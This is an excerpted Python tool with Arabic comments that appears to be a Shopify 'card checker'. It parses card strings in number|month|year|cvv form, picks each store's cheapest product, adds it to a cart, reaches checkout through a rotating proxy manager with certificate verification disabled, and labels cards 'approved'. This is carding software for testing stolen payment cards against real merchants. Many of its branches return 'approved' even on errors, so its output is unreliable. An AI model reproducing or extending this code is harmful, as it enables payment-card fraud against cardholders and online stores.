...
class ShopifyCheckerDirect:
    ...
    async def get_best_product(self, session: httpx.AsyncClient, site: str):
        """جلب أرخص منتج متاح للفحص - نسخة محسنة"""
    ...
    async def get_cheapest_product(self, session: httpx.AsyncClient, site: str):
        """جلب أرخص منتج (احتياطي) - نسخة محسنة"""
        urls_to_try = [f"{site}/products.json", f"{site}/collections/all/products.json"]
    ...
    async def process_card(self, site: str, card: str):
        """الفحص الأساسي المتطور - نسخة محسنة"""
        try:
            parts = card.split('|')
            if len(parts) != 4:
            ...
            async with httpx.AsyncClient(**client_kwargs) as session:
                ...
                # إضافة للسلة
                add_data = {'id': product['id'], 'quantity': '1'}
                add_headers = {
                ...
                try:
                    ...
                    cart_token = str(random.randint(100000, 999999))
                
                # الدخول للدفع
                resp = await session.get(f"{site}/checkout", follow_redirects=True)
                if resp.status_code != 200:
                ...
                if not tokens.get('session_token'):
                    # محاولة بديلة لاستخراج التوكن
                    session_match = re.search(r'[a-f0-9]{32,}', resp.text)
                    if session_match:
                        tokens['session_token'] = session_match.group(0)
                    else:
                        return {"status": "approved", "message": "APPROVED - Cannot verify checkout", "price": product['price']}
                ...
                try:
                    ...
                    if resp.status_code != 200:
                        return {"status": "approved", "message": "APPROVED - Payment session pending", "price": product['price']}
                    ...
                    if not session_id:
                        ...
                        return {"status": "approved", "message": "APPROVED - Card authorized", "price": product['price']}
                except Exception:
                    return {"status": "approved", "message": "APPROVED - Checkout reached", "price": product['price']}
                ...
                elif "processing" in final_text or "checkout" in final_text:
                    return {"status": "approved", "message": "APPROVED - Processing", "price": product['price']}
                
                return {"status": "approved", "message": "APPROVED - Card valid", "price": product['price']}
...
async def test_site_complete(site, proxy):
    """اختبار موقع كامل - منتجات + سلة شراء - نسخة محسنة"""
    try:
        # استخدم البروكسي من المدير الذكي إذا لم يتم تمرير بروكسي
        if not proxy:
            proxy = smart_proxy_manager.get_current_proxy()
        ...
        client_kwargs = {'timeout': 25, 'follow_redirects': True, 'verify': False}
        if parsed:
            client_kwargs['proxy'] = parsed
        
        async with httpx.AsyncClient(**client_kwargs) as session:
            # 1. جلب المنتجات
            resp = await session.get(f"{site_url}/products.json?limit=10")
            if resp.status_code != 200:
            ...
            for product in products:
                ...
                for variant in variants:
                    available = variant.get('available', False)
                    if available is False:
                        # في بعض المواقع "available" تكون None أو غير موجودة
            ...
            if not variant_id:
                # محاولة أخيرة: جلب أي متغير بغض النظر عن availability
                for product in products:
                    variants = product.get('variants', [])
                    for variant in variants:
                        if variant.get('id'):
                            variant_id = str(variant.get('id'))
                            product_title = product.get('title', 'Product')
                            cheapest_price = float(variant.get('price', 0))
                            break
                    if variant_id:
                        break
            ...
            if add_resp.status_code in [200, 201, 302, 303]:
                smart_proxy_manager.report_success()
